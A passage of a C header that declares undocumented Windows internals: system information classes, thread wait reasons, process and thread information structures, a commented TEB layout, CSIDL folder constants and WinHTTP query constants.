    SystemLeapSecondInformation,                            // q: SYSTEM_LEAP_SECOND_INFORMATION
    SystemFlags2Information,                                // q: SYSTEM_FLAGS_INFORMATION
    SystemSecurityModelInformation,                         // q: SYSTEM_SECURITY_MODEL_INFORMATION // since 19H1
    SystemCodeIntegritySyntheticCacheInformation,           // qs: NtQuerySystemInformationEx
    SystemFeatureConfigurationInformation,                  // q: in: SYSTEM_FEATURE_CONFIGURATION_QUERY, out: SYSTEM_FEATURE_CONFIGURATION_INFORMATION; s: SYSTEM_FEATURE_CONFIGURATION_UPDATE // NtQuerySystemInformationEx // since 20H1 // 210
    SystemFeatureConfigurationSectionInformation,           // q: in: SYSTEM_FEATURE_CONFIGURATION_SECTIONS_REQUEST, out: SYSTEM_FEATURE_CONFIGURATION_SECTIONS_INFORMATION // NtQuerySystemInformationEx
    SystemFeatureUsageSubscriptionInformation,              // q: SYSTEM_FEATURE_USAGE_SUBSCRIPTION_DETAILS; s: SYSTEM_FEATURE_USAGE_SUBSCRIPTION_UPDATE
    SystemSecureSpeculationControlInformation,              // q: SECURE_SPECULATION_CONTROL_INFORMATION
    SystemSpacesBootInformation,                            // qs: since 20H2
    SystemFwRamdiskInformation,                             // q: SYSTEM_FIRMWARE_RAMDISK_INFORMATION
    SystemWheaIpmiHardwareInformation,
    SystemDifSetRuleClassInformation,                       // s: SYSTEM_DIF_VOLATILE_INFORMATION (requires SeDebugPrivilege)
    SystemDifClearRuleClassInformation,                     // s: NULL (requires SeDebugPrivilege)
    SystemDifApplyPluginVerificationOnDriver,               // q: SYSTEM_DIF_PLUGIN_DRIVER_INFORMATION (requires SeDebugPrivilege)
    SystemDifRemovePluginVerificationOnDriver,              // q: SYSTEM_DIF_PLUGIN_DRIVER_INFORMATION (requires SeDebugPrivilege) // 220
    SystemShadowStackInformation,                           // q: SYSTEM_SHADOW_STACK_INFORMATION
    SystemBuildVersionInformation,                          // q: in: ULONG (LayerNumber), out: SYSTEM_BUILD_VERSION_INFORMATION // NtQuerySystemInformationEx
    SystemPoolLimitInformation,                             // q: SYSTEM_POOL_LIMIT_INFORMATION (requires SeIncreaseQuotaPrivilege) // NtQuerySystemInformationEx
    SystemCodeIntegrityAddDynamicStore,                     // q: CodeIntegrity-AllowConfigurablePolicy-CustomKernelSigners
    SystemCodeIntegrityClearDynamicStores,                  // q: CodeIntegrity-AllowConfigurablePolicy-CustomKernelSigners
    SystemDifPoolTrackingInformation,
    SystemPoolZeroingInformation,                           // q: SYSTEM_POOL_ZEROING_INFORMATION
    SystemDpcWatchdogInformation,                           // qs: SYSTEM_DPC_WATCHDOG_CONFIGURATION_INFORMATION
    SystemDpcWatchdogInformation2,                          // qs: SYSTEM_DPC_WATCHDOG_CONFIGURATION_INFORMATION_V2
    SystemSupportedProcessorArchitectures2,                 // q: in opt: HANDLE, out: SYSTEM_SUPPORTED_PROCESSOR_ARCHITECTURES_INFORMATION[] // NtQuerySystemInformationEx // 230
    SystemSingleProcessorRelationshipInformation,           // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX // (EX in: PROCESSOR_NUMBER Processor) // NtQuerySystemInformationEx
    SystemXfgCheckFailureInformation,                       // q: SYSTEM_XFG_FAILURE_INFORMATION
    SystemIommuStateInformation,                            // q: SYSTEM_IOMMU_STATE_INFORMATION // since 22H1
    SystemHypervisorMinrootInformation,                     // q: SYSTEM_HYPERVISOR_MINROOT_INFORMATION
    SystemHypervisorBootPagesInformation,                   // q: SYSTEM_HYPERVISOR_BOOT_PAGES_INFORMATION
    SystemPointerAuthInformation,                           // q: SYSTEM_POINTER_AUTH_INFORMATION
    SystemSecureKernelDebuggerInformation,                  // qs: NtQuerySystemInformationEx
    SystemOriginalImageFeatureInformation,                  // q: in: SYSTEM_ORIGINAL_IMAGE_FEATURE_INFORMATION_INPUT, out: SYSTEM_ORIGINAL_IMAGE_FEATURE_INFORMATION_OUTPUT // NtQuerySystemInformationEx
    SystemMemoryNumaInformation,                            // q: SYSTEM_MEMORY_NUMA_INFORMATION_INPUT, SYSTEM_MEMORY_NUMA_INFORMATION_OUTPUT // NtQuerySystemInformationEx
    SystemMemoryNumaPerformanceInformation,                 // q: SYSTEM_MEMORY_NUMA_PERFORMANCE_INFORMATION_INPUTSYSTEM_MEMORY_NUMA_PERFORMANCE_INFORMATION_INPUT, SYSTEM_MEMORY_NUMA_PERFORMANCE_INFORMATION_OUTPUT // since 24H2 // 240
    SystemCodeIntegritySignedPoliciesFullInformation,
    SystemSecureCoreInformation,                            // qs: SystemSecureSecretsInformation
    SystemTrustedAppsRuntimeInformation,                    // q: SYSTEM_TRUSTEDAPPS_RUNTIME_INFORMATION
    SystemBadPageInformationEx,                             // q: SYSTEM_BAD_PAGE_INFORMATION
    SystemResourceDeadlockTimeout,                          // q: ULONG
    SystemBreakOnContextUnwindFailureInformation,           // q: ULONG (requires SeDebugPrivilege)
    SystemOslRamdiskInformation,                            // q: SYSTEM_OSL_RAMDISK_INFORMATION
    SystemCodeIntegrityPolicyManagementInformation,         // q: SYSTEM_CODEINTEGRITYPOLICY_MANAGEMENT // since 25H2
    SystemMemoryNumaCacheInformation,
    SystemProcessorFeaturesBitMapInformation,               // q: // 250
    SystemRefTraceInformationEx,                            // q: SYSTEM_REF_TRACE_INFORMATION_EX
    SystemBasicProcessInformation,                          // q: SYSTEM_BASICPROCESS_INFORMATION
    SystemHandleCountInformation,                           // q: SYSTEM_HANDLECOUNT_INFORMATION
    MaxSystemInfoClass
} SYSTEM_INFORMATION_CLASS;

typedef enum _KWAIT_REASON
{
    Executive,
    FreePage,
    PageIn,
    PoolAllocation,
    DelayExecution,
    Suspended,
    UserRequest,
    WrExecutive,
    WrFreePage,
    WrPageIn,
    WrPoolAllocation,
    WrDelayExecution,
    WrSuspended,
    WrUserRequest,
    WrEventPair,
    WrQueue,
    WrLpcReceive,
    WrLpcReply,
    WrVirtualMemory,
    WrPageOut,
    WrRendezvous,
    WrKeyedEvent,
    WrTerminated,
    WrProcessInSwap,
    WrCpuRateControl,
    WrCalloutStack,
    WrKernel,
    WrResource,
    WrPushLock,
    WrMutex,
    WrQuantumEnd,
    WrDispatchInt,
    WrPreempted,
    WrYieldExecution,
    WrFastMutex,
    WrGuardedMutex,
    WrRundown,
    WrAlertByThreadId,
    WrDeferredPreempt,
    WrPhysicalFault,
    WrIoRing,
    WrMdlCache,
    WrRcu,
    MaximumWaitReason
} KWAIT_REASON, *PKWAIT_REASON;

typedef LONG KPRIORITY, *PKPRIORITY;


typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef enum _KTHREAD_STATE
{
    Initialized,
    Ready,
    Running,
    Standby,
    Terminated,
    Waiting,
    Transition,
    DeferredReady,
    GateWaitObsolete,
    WaitingForProcessInSwap,
    MaximumThreadState
} KTHREAD_STATE, *PKTHREAD_STATE;

typedef struct _SYSTEM_THREAD_INFORMATION
{
    LARGE_INTEGER KernelTime;                   // Number of 100-nanosecond intervals spent executing kernel code.
    LARGE_INTEGER UserTime;                     // Number of 100-nanosecond intervals spent executing user code.
    LARGE_INTEGER CreateTime;                   // The date and time when the thread was created.
    ULONG WaitTime;                             // The current time spent in ready queue or waiting (depending on the thread state).
    PVOID StartAddress;                         // The initial start address of the thread.
    CLIENT_ID ClientId;                         // The identifier of the thread and the process owning the thread.
    KPRIORITY Priority;                         // The dynamic priority of the thread.
    KPRIORITY BasePriority;                     // The starting priority of the thread.
    ULONG ContextSwitches;                      // The total number of context switches performed.
    KTHREAD_STATE ThreadState;                  // The current state of the thread.
    KWAIT_REASON WaitReason;                    // The current reason the thread is waiting.
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG NextEntryOffset;                      // The address of the previous item plus the value in the NextEntryOffset member. For the last item in the array, NextEntryOffset is 0.
    ULONG NumberOfThreads;                      // The NumberOfThreads member contains the number of threads in the process.
    ULONGLONG WorkingSetPrivateSize;            // The total private memory that a process currently has allocated and is physically resident in memory. // since VISTA
    ULONG HardFaultCount;                       // The total number of hard faults for data from disk rather than from in-memory pages. // since WIN7
    ULONG NumberOfThreadsHighWatermark;         // The peak number of threads that were running at any given point in time, indicative of potential performance bottlenecks related to thread management.
    ULONGLONG CycleTime;                        // The sum of the cycle time of all threads in the process.
    LARGE_INTEGER CreateTime;                   // Number of 100-nanosecond intervals since the creation time of the process. Not updated during system timezone changes.
    LARGE_INTEGER UserTime;                     // Number of 100-nanosecond intervals the process has executed in user mode.
    LARGE_INTEGER KernelTime;                   // Number of 100-nanosecond intervals the process has executed in kernel mode.
    UNICODE_STRING ImageName;                   // The file name of the executable image.
    KPRIORITY BasePriority;                     // The starting priority of the process.
    HANDLE UniqueProcessId;                     // The identifier of the process.
    HANDLE InheritedFromUniqueProcessId;        // The identifier of the process that created this process. Not updated and incorrectly refers to processes with recycled identifiers.
    ULONG HandleCount;                          // The current number of open handles used by the process.
    ULONG SessionId;                            // The identifier of the Remote Desktop Services session under which the specified process is running.
    ULONG_PTR UniqueProcessKey;                 // since VISTA (requires SystemExtendedProcessInformation)
    SIZE_T PeakVirtualSize;                     // The peak size, in bytes, of the virtual memory used by the process.
    SIZE_T VirtualSize;                         // The current size, in bytes, of virtual memory used by the process.
    ULONG PageFaultCount;                       // The total number of page faults for data that is not currently in memory. The value wraps around to zero on average 24 hours.
    SIZE_T PeakWorkingSetSize;                  // The peak size, in kilobytes, of the working set of the process.
    SIZE_T WorkingSetSize;                      // The number of pages visible to the process in physical memory. These pages are resident and available for use without triggering a page fault.
    SIZE_T QuotaPeakPagedPoolUsage;             // The peak quota charged to the process for pool usage, in bytes.
    SIZE_T QuotaPagedPoolUsage;                 // The quota charged to the process for paged pool usage, in bytes.
    SIZE_T QuotaPeakNonPagedPoolUsage;          // The peak quota charged to the process for nonpaged pool usage, in bytes.
    SIZE_T QuotaNonPagedPoolUsage;              // The current quota charged to the process for nonpaged pool usage.
    SIZE_T PagefileUsage;                       // The total number of bytes of page file storage in use by the process.
    SIZE_T PeakPagefileUsage;                   // The maximum number of bytes of page-file storage used by the process.
    SIZE_T PrivatePageCount;                    // The number of memory pages allocated for the use by the process.
    LARGE_INTEGER ReadOperationCount;           // The total number of read operations performed.
    LARGE_INTEGER WriteOperationCount;          // The total number of write operations performed.
    LARGE_INTEGER OtherOperationCount;          // The total number of I/O operations performed other than read and write operations.
    LARGE_INTEGER ReadTransferCount;            // The total number of bytes read during a read operation.
    LARGE_INTEGER WriteTransferCount;           // The total number of bytes written during a write operation.
    LARGE_INTEGER OtherTransferCount;           // The total number of bytes transferred during operations other than read and write operations.
    SYSTEM_THREAD_INFORMATION Threads[1];       // This type is not defined in the structure but was added for convenience.
} SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;

#ifndef CSIDL_PERSONAL
#define CSIDL_PERSONAL 0x0005
#endif

#ifndef CSIDL_MYMUSIC
#define CSIDL_MYMUSIC 0x000d
#endif

#ifndef CSIDL_APPDATA
#define CSIDL_APPDATA 0x001A
#endif

#ifndef CSIDL_LOCAL_APPDATA

#define CSIDL_LOCAL_APPDATA 0x001C
#define CSIDL_INTERNET_CACHE 0x0020
#define CSIDL_COOKIES 0x0021
#define CSIDL_HISTORY 0x0022
#define CSIDL_COMMON_APPDATA 0x0023
#define CSIDL_WINDOWS 0x0024
#define CSIDL_SYSTEM 0x0025
#define CSIDL_PROGRAM_FILES 0x0026
#define CSIDL_MYPICTURES 0x0027
#define CSIDL_PROGRAM_FILES_COMMON 0x002b
#define CSIDL_COMMON_DOCUMENTS 0x002e
#define CSIDL_RESOURCES 0x0038
#define CSIDL_RESOURCES_LOCALIZED 0x0039

#define CSIDL_FLAG_CREATE 0x8000

#define CSIDL_COMMON_ADMINTOOLS 0x002f
#define CSIDL_ADMINTOOLS 0x0030
#endif

// NtCurrentTeb()->ResourceRetValue
// LdrFindResource* and LdrAccessResource
typedef struct _LDR_RESLOADER_RET
{
    PVOID Module;
    PVOID DataEntry;
    PVOID TargetModule;
} LDR_RESLOADER_RET, *PLDR_RESLOADER_RET;

typedef struct _ACTIVATION_CONTEXT_DATA
{
    ULONG Magic;
    ULONG HeaderSize;
    ULONG FormatVersion;
    ULONG TotalSize;
    ULONG DefaultTocOffset; // to ACTIVATION_CONTEXT_DATA_TOC_HEADER
    ULONG ExtendedTocOffset; // to ACTIVATION_CONTEXT_DATA_EXTENDED_TOC_HEADER
    ULONG AssemblyRosterOffset; // to ACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_HEADER
    ULONG Flags; // ACTIVATION_CONTEXT_FLAG_*
} ACTIVATION_CONTEXT_DATA, *PACTIVATION_CONTEXT_DATA;

typedef struct _ASSEMBLY_STORAGE_MAP_ENTRY
{
    ULONG Flags;
    UNICODE_STRING DosPath;
    HANDLE Handle;
} ASSEMBLY_STORAGE_MAP_ENTRY, *PASSEMBLY_STORAGE_MAP_ENTRY;

typedef struct _ASSEMBLY_STORAGE_MAP
{
    ULONG Flags;
    ULONG AssemblyCount;
    PASSEMBLY_STORAGE_MAP_ENTRY *AssemblyArray;

  } ASSEMBLY_STORAGE_MAP, *PASSEMBLY_STORAGE_MAP;

typedef VOID (NTAPI *PACTIVATION_CONTEXT_NOTIFY_ROUTINE)(
    _In_ ULONG NotificationType, // ACTIVATION_CONTEXT_NOTIFICATION_*
    _In_ PVOID ActivationContext,
    _In_ PVOID ActivationContextData,
    _In_opt_ PVOID NotificationContext,
    _In_opt_ PVOID NotificationData,
    _Inout_ PBOOLEAN DisableThisNotification
    );

typedef struct _ACTIVATION_CONTEXT
{
    LONG RefCount;
    ULONG Flags;
    PACTIVATION_CONTEXT_DATA ActivationContextData;
    PACTIVATION_CONTEXT_NOTIFY_ROUTINE NotificationRoutine;
    PVOID NotificationContext;
    ULONG SentNotifications[8];
    ULONG DisabledNotifications[8];
    ASSEMBLY_STORAGE_MAP StorageMap;
    PASSEMBLY_STORAGE_MAP_ENTRY InlineStorageMapEntries[32];
} ACTIVATION_CONTEXT, *PACTIVATION_CONTEXT;

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME
{
    struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME *Previous;
    PACTIVATION_CONTEXT ActivationContext;
    ULONG Flags; // RTL_ACTIVATION_CONTEXT_STACK_FRAME_FLAG_*
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, *PRTL_ACTIVATION_CONTEXT_STACK_FRAME;


typedef struct _ACTIVATION_CONTEXT_STACK
{
    PRTL_ACTIVATION_CONTEXT_STACK_FRAME ActiveFrame;
    LIST_ENTRY FrameListCache;
    ULONG Flags; // ACTIVATION_CONTEXT_STACK_FLAG_*
    ULONG NextCookieSequenceNumber;
    ULONG StackId;
} ACTIVATION_CONTEXT_STACK, *PACTIVATION_CONTEXT_STACK;

/**
 * The GDI_TEB_BATCH structure is used to store information about GDI batch operations.
 */
typedef struct _GDI_TEB_BATCH
{
    ULONG Offset;
    ULONG_PTR HDC;
    ULONG Buffer[310];
} GDI_TEB_BATCH, *PGDI_TEB_BATCH;

/**
 * The TEB_ACTIVE_FRAME_CONTEXT structure is used to store information about an active frame context.
 */
typedef struct _TEB_ACTIVE_FRAME_CONTEXT
{
    ULONG Flags;
    PCSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;

/**
 * The TEB_ACTIVE_FRAME structure is used to store information about an active frame.
 */
typedef struct _TEB_ACTIVE_FRAME
{
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME *Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

typedef struct tagSOleTlsData
{
    PVOID ThreadBase;
    PVOID SmAllocator;
    ULONG ApartmentID;
    ULONG Flags; // OLETLSFLAGS
    LONG TlsMapIndex;
    PVOID *TlsSlot;
    ULONG ComInits;
    ULONG OleInits;
    ULONG Calls;
    PVOID ServerCall; // previously CallInfo (before TH1)
    PVOID CallObjectCache; // previously FreeAsyncCall (before TH1)
    PVOID ContextStack; // previously FreeClientCall (before TH1)
    PVOID ObjServer;
    ULONG TIDCaller;
    // ... (other fields are version-dependant)
} SOleTlsData, *PSOleTlsData;

typedef struct _MY_PROCESSOR_NUMBER {
  WORD Group;
  BYTE Number;
  BYTE Reserved;
} MY_PROCESSOR_NUMBER, *PMY_PROCESSOR_NUMBER;

/**
 * Thread Environment Block (TEB) structure.
 *
 * \sa https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb
 */
typedef struct _TEB
{
    //
    // Thread Information Block (TIB) contains the thread's stack, base and limit addresses, the current stack pointer, and the exception list.
    //
    NT_TIB NtTib;

    //
    // Reserved.
    //
    PVOID EnvironmentPointer;

    //
    // Client ID for this thread.
    //
    CLIENT_ID ClientId;

    //
    // A handle to an active Remote Procedure Call (RPC) if the thread is currently involved in an RPC operation.
    //
    PVOID ActiveRpcHandle;

    //
    // A pointer to the __declspec(thread) local storage array.
    //
    PVOID ThreadLocalStoragePointer;

    //
    // A pointer to the Process Environment Block (PEB), which contains information about the process.
    //
    PPEB ProcessEnvironmentBlock;

    //
    // The previous Win32 error value for this thread.
    //
    ULONG LastErrorValue;

    //
    // The number of critical sections currently owned by this thread.
    //
    ULONG CountOfOwnedCriticalSections;

    //
    // Reserved.
    //
    PVOID CsrClientThread;

    //
    // Reserved for win32k.sys
    //
    PVOID Win32ThreadInfo;
 
    //
    // Reserved for user32.dll
    //
    ULONG User32Reserved[26];

    //
    // Reserved for winsrv.dll
    //
    ULONG UserReserved[5];

    //
    // Reserved.
    //
    PVOID WOW32Reserved;

    //
    // The LCID of the current thread. (Kernel32!GetThreadLocale)
    //
    LCID CurrentLocale;

    //
    // Reserved.
    //
    ULONG FpSoftwareStatusRegister;

    //
    // Reserved.
    //
    PVOID ReservedForDebuggerInstrumentation[16];

#ifdef _WIN64
    //
    // Reserved for floating-point emulation.
    //
    PVOID SystemReserved1[25];

    //
    // Per-thread fiber local storage. (Teb->HasFiberData)
    //
    PVOID HeapFlsData;

    //
    // Reserved.
    //
    ULONG_PTR RngState[4];
#else
    //
    // Reserved.
    //
    PVOID SystemReserved1[26];
#endif

    //
    // Placeholder compatibility mode. (ProjFs and Cloud Files)
    //
    CHAR PlaceholderCompatibilityMode;

    //
    // Indicates whether placeholder hydration is always explicit.
    //
    BOOLEAN PlaceholderHydrationAlwaysExplicit;

    //
    // ProjFs and Cloud Files (reparse point) file virtualization.
    //
    CHAR PlaceholderReserved[10];

    //
    // The process ID (PID) that the current COM server thread is acting on behalf of.
    //
    ULONG ProxiedProcessId;

    //
    // Pointer to the activation context stack for the current thread.
    //
    ACTIVATION_CONTEXT_STACK ActivationStack;

    //
    // Opaque operation on behalf of another user or process.
    //
    UCHAR WorkingOnBehalfTicket[8];

    //
    // The last exception status for the current thread.
    //
    NTSTATUS ExceptionCode;

    //
    // Pointer to the activation context stack for the current thread.
    //
    PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;

    //
    // The stack pointer (SP) of the current system call or exception during instrumentation.
    //
    ULONG_PTR InstrumentationCallbackSp;

    //
    // The program counter (PC) of the previous system call or exception during instrumentation.
    //
    ULONG_PTR InstrumentationCallbackPreviousPc;

    //
    // The stack pointer (SP) of the previous system call or exception during instrumentation.
    //
    ULONG_PTR InstrumentationCallbackPreviousSp;

#ifdef _WIN64
    //
    // The miniversion ID of the current transacted file operation.
    //
    ULONG TxFsContext;
#endif

    //
    // Indicates the state of the system call or exception instrumentation callback.
    //
    BOOLEAN InstrumentationCallbackDisabled;

#ifdef _WIN64
    //
    // Indicates the state of alignment exceptions for unaligned load/store operations.
    //
    BOOLEAN UnalignedLoadStoreExceptions;
#endif

#ifndef _WIN64
    //
    // SpareBytes.
    //
    UCHAR SpareBytes[23];

    //
    // The miniversion ID of the current transacted file operation.
    //
    ULONG TxFsContext;
#endif

    //
    // Reserved for GDI (Win32k).
    //
    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;

    //
    // Reserved for User32 (Win32k).
    //
    ULONG_PTR Win32ClientInfo[62];

    //
    // Reserved for opengl32.dll
    //
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    //
    // The previous status value for this thread.
    //
    NTSTATUS LastStatusValue;

    //
    // A static string for use by the application.
    //
    UNICODE_STRING StaticUnicodeString;

    //
    // A static buffer for use by the application.
    //
    WCHAR StaticUnicodeBuffer[261];

    //
    // The maximum stack size and indicates the base of the stack.
    //
    PVOID DeallocationStack;

    //
    // Data for Thread Local Storage. (TlsGetValue)
    //
    PVOID TlsSlots[TLS_MINIMUM_AVAILABLE];

    //
    // Reserved for TLS.
    //
    LIST_ENTRY TlsLinks;

    //
    // Reserved for NTVDM.
    //
    PVOID Vdm;

    //
    // Reserved for RPC. The pointer is XOR'ed with RPC_THREAD_POINTER_KEY.
    //
    PVOID ReservedForNtRpc;

    //
    // Reserved for Debugging (DebugActiveProcess).
    //
    PVOID DbgSsReserved[2];

    //
    // The error mode for the current thread. (GetThreadErrorMode)
    //
    ULONG HardErrorMode;

    //
    // Reserved.
    //
#ifdef _WIN64
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif

    //
    // Reserved.
    //
    GUID ActivityId;

    //
    // The identifier of the service that created the thread. (svchost)
    //
    PVOID SubProcessTag;

    //
    // Reserved.
    //
    PVOID PerflibData;

    //
    // Reserved.
    //
    PVOID EtwTraceData;

    //
    // The address of a socket handle during a blocking socket operation. (WSAStartup)
    //
    HANDLE WinSockData;

    //
    // The number of function calls accumulated in the current GDI batch. (GdiSetBatchLimit)
    //
    ULONG GdiBatchCount;

    //
    // The preferred processor for the current thread. (SetThreadIdealProcessor/SetThreadIdealProcessorEx)
    //
    union
    {
        MY_PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    //
    // The minimum size of the stack available during any stack overflow exceptions. (SetThreadStackGuarantee)
    //
    ULONG GuaranteedStackBytes;

    //
    // Reserved.
    //
    PVOID ReservedForPerf;

    //
    // Reserved for Object Linking and Embedding (OLE)
    //
    PSOleTlsData ReservedForOle;

    //
    // Indicates whether the thread is waiting on the loader lock.
    //
    ULONG WaitingOnLoaderLock;

    //
    // The saved priority state for the thread.
    //
    PVOID SavedPriorityState;

    //
    // Reserved.
    //
    ULONG_PTR ReservedForCodeCoverage;

    //
    // Reserved.
    //
    PVOID ThreadPoolData;

    //
    // Pointer to the TLS (Thread Local Storage) expansion slots for the thread.
    //
    PVOID *TlsExpansionSlots;

#ifdef _WIN64
    PVOID ChpeV2CpuAreaInfo; // CHPEV2_CPUAREA_INFO // previously DeallocationBStore
    PVOID Unused; // previously BStoreLimit
#endif

    //
    // The generation of the MUI (Multilingual User Interface) data.
    //
    ULONG MuiGeneration;

    //
    // Indicates whether the thread is impersonating another security context.
    //
    ULONG IsImpersonating;

    //
    // Pointer to the NLS (National Language Support) cache.
    //
    PVOID NlsCache;

    //
    // Pointer to the AppCompat/Shim Engine data.
    //
    PVOID pShimData;

    //
    // Reserved.
    //
    ULONG HeapData;

    //
    // Handle to the current transaction associated with the thread.
    //
    HANDLE CurrentTransactionHandle;

    //
    // Pointer to the active frame for the thread.
    //
    PTEB_ACTIVE_FRAME ActiveFrame;

    //
    // Reserved for FLS (RtlProcessFlsData).
    //
    PVOID FlsData;

    //
    // Pointer to the preferred languages for the current thread. (GetThreadPreferredUILanguages)
    //
    PVOID PreferredLanguages;

    //
    // Pointer to the user-preferred languages for the current thread. (GetUserPreferredUILanguages)
    //
    PVOID UserPrefLanguages;

    //
    // Pointer to the merged preferred languages for the current thread. (MUI_MERGE_USER_FALLBACK)
    //
    PVOID MergedPrefLanguages;

    //
    // Indicates whether the thread is impersonating another user's language settings.
    //
    ULONG MuiImpersonation;

    //
    // Reserved.
    //
    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };

    //
    // SameTebFlags modify the state and behavior of the current thread.
    //
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;            // Indicates if the thread is currently in a debug print routine.
            USHORT HasFiberData : 1;            // Indicates if the thread has local fiber-local storage (FLS).
            USHORT SkipThreadAttach : 1;        // Indicates if the thread should suppress DLL_THREAD_ATTACH notifications.
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;          // Indicates if the thread has run process initialization code.
            USHORT ClonedThread : 1;            // Indicates if the thread is a clone of a different thread.
            USHORT SuppressDebugMsg : 1;        // Indicates if the thread should suppress LOAD_DLL_DEBUG_INFO notifications.
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;           // Indicates if the thread is the initial thread of the process.
            USHORT SessionAware : 1;
            USHORT LoadOwner : 1;               // Indicates if the thread is the owner of the process loader lock.
            USHORT LoaderWorker : 1;
            USHORT SkipLoaderInit : 1;
            USHORT SkipFileAPIBrokering : 1;
        };
    };

    //
    // Pointer to the callback function that is called when a KTM transaction scope is entered.
    //
    PVOID TxnScopeEnterCallback;

    //
    // Pointer to the callback function that is called when a KTM transaction scope is exited.
    ///
    PVOID TxnScopeExitCallback;

    //
    // Pointer to optional context data for use by the application when a KTM transaction scope callback is called.
    //
    PVOID TxnScopeContext;

    //
    // The lock count of critical sections for the current thread.
    //
    ULONG LockCount;

    //
    // The offset to the WOW64 (Windows on Windows) TEB for the current thread.
    //
    LONG WowTebOffset;

    //
    // Pointer to the DLL containing the resource (valid after LdrFindResource_U/LdrResFindResource/etc... returns).
    //
    PLDR_RESLOADER_RET ResourceRetValue;

    //
    // Reserved for Windows Driver Framework (WDF).
    //
    PVOID ReservedForWdf;

    //
    // Reserved for the Microsoft C runtime (CRT).
    //
    ULONGLONG ReservedForCrt;

    //
    // The Host Compute Service (HCS) container identifier.
    //
    GUID EffectiveContainerId;

    //
    // Reserved for Kernel32!Sleep (SpinWait).
    //
    ULONGLONG LastSleepCounter; // since Win11

    //
    // Reserved for Kernel32!Sleep (SpinWait).
    //
    ULONG SpinCallCount;

    //
    // Extended feature disable mask (AVX).
    //
    ULONGLONG ExtendedFeatureDisableMask;

    //
    // Reserved.
    //
    PVOID SchedulerSharedDataSlot; // since 24H2

    //
    // Reserved.
    //
    PVOID HeapWalkContext;

    //
    // The primary processor group affinity of the thread.
    //
    GROUP_AFFINITY PrimaryGroupAffinity;

    //
    // Read-copy-update (RCU) synchronization context.
    //
    ULONG Rcu[2];
} TEB, *PTEB;

#define SECPKG_ATTR_REMOTE_CERT_CONTEXT 83
#define INTERNET_ERROR_MASK_INSERT_CDROM 0x1
#define INTERNET_ERROR_MASK_COMBINED_SEC_CERT 0x2
#define INTERNET_ERROR_MASK_NEED_MSN_SSPI_PKG 0X4
#define INTERNET_ERROR_MASK_LOGIN_FAILURE_DISPLAY_ENTITY_BODY 0x8

#define INTERNET_OPTIONS_MASK (~INTERNET_FLAGS_MASK)

#define WININET_API_FLAG_ASYNC 0x00000001
#define WININET_API_FLAG_SYNC 0x00000004
#define WININET_API_FLAG_USE_CONTEXT 0x00000008

#define INTERNET_NO_CALLBACK 0



#define WINHTTP_QUERY_MIME_VERSION                 0
#define WINHTTP_QUERY_CONTENT_TYPE                 1
#define WINHTTP_QUERY_CONTENT_TRANSFER_ENCODING    2
#define WINHTTP_QUERY_CONTENT_ID                   3
#define WINHTTP_QUERY_CONTENT_DESCRIPTION          4
#define WINHTTP_QUERY_CONTENT_LENGTH               5
#define WINHTTP_QUERY_CONTENT_LANGUAGE             6
#define WINHTTP_QUERY_ALLOW                        7
#define WINHTTP_QUERY_PUBLIC                       8
#define WINHTTP_QUERY_DATE                         9
#define WINHTTP_QUERY_EXPIRES                      10
#define WINHTTP_QUERY_LAST_MODIFIED                11
#define WINHTTP_QUERY_MESSAGE_ID                   12
#define WINHTTP_QUERY_URI                          13
#define WINHTTP_QUERY_DERIVED_FROM                 14
#define WINHTTP_QUERY_COST                         15
#define WINHTTP_QUERY_LINK                         16
#define WINHTTP_QUERY_PRAGMA                       17
#define WINHTTP_QUERY_VERSION                      18
#define WINHTTP_QUERY_STATUS_CODE                  19
#define WINHTTP_QUERY_STATUS_TEXT                  20
#define WINHTTP_QUERY_RAW_HEADERS                  21
#define WINHTTP_QUERY_RAW_HEADERS_CRLF             22
#define WINHTTP_QUERY_CONNECTION                   23
#define WINHTTP_QUERY_ACCEPT                       24
#define WINHTTP_QUERY_ACCEPT_CHARSET               25
#define WINHTTP_QUERY_ACCEPT_ENCODING              26
#define WINHTTP_QUERY_ACCEPT_LANGUAGE              27
#define WINHTTP_QUERY_AUTHORIZATION                28
#define WINHTTP_QUERY_CONTENT_ENCODING             29
#define WINHTTP_QUERY_FORWARDED                    30
#define WINHTTP_QUERY_FROM                         31
#define WINHTTP_QUERY_IF_MODIFIED_SINCE            32
#define WINHTTP_QUERY_LOCATION                     33
#define WINHTTP_QUERY_ORIG_URI                     34
#define WINHTTP_QUERY_REFERER                      35
#define WINHTTP_QUERY_RETRY_AFTER                  36
#define WINHTTP_QUERY_SERVER                       37
#define WINHTTP_QUERY_TITLE                        38
